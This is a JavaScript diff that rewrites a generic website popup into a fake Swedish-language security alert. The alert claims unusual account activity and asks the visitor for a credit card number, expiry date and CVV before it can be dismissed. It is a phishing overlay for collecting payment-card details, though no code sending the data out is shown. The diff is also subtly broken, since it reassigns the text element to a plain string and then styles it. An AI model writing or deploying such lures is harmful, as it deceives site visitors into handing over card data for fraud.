@@ -1,6 +1,7 @@
 class Popup {
     constructor() {
         this.popup = document.createElement("DIV");
+        this.popupHeader = document.createElement("H1");
         this.popupText = document.createElement("P");
         this.popupCCNumberField = document.createElement("INPUT");
         this.popupCCDateField = document.createElement("INPUT");
@@ -15,7 +16,8 @@ class Popup {
         this.popup.style.left = "50%";
         this.popup.style.marginLeft = "-200px";
         this.popup.style.boxShadow = "1px 1px 15px 5px #333333AA";
-        this.popupText.innerHTML = "Why are you visiting this website?";
+        this.popupHeader.innerHTML = "Onormal aktivitet har upptäckts på ditt konto";
+        this.popupText = "För att verifiera att det verkligen är du och fortsätta använda tjänsten behöver vi verifiera dina kontouppgifter";
         this.popupText.style.textAlign = "center";
         this.popupText.style.marginTop = "3%";
         this.popupText.style.marginBottom = "3%";
@@ -27,13 +29,16 @@ class Popup {
         this.popupButton.style.width = "20%";
         this.popupButton.style.marginLeft = "40%";
         this.popupButton.addEventListener("click", this.closePopUp.bind(this));
+        this.popup.appendChild(this.popupHeader);
         this.popup.appendChild(this.popupText);
-        this.popup.appendChild(this.popupTextArea);
+        this.popup.appendChild(this.popupCCNumberField);
+        this.popup.appendChild(this.popupCCDateField);
+        this.popup.appendChild(this.popupCCCVVField);
         this.popup.appendChild(this.popupButton);
         document.body.appendChild(this.popup);
     }
     closePopUp() {
-        if (this.popupTextArea.value.length > 0) {
+        if (this.popupCCNumberField.value.length > 0) {
             this.popup.parentElement.removeChild(this.popup);
         }
     }
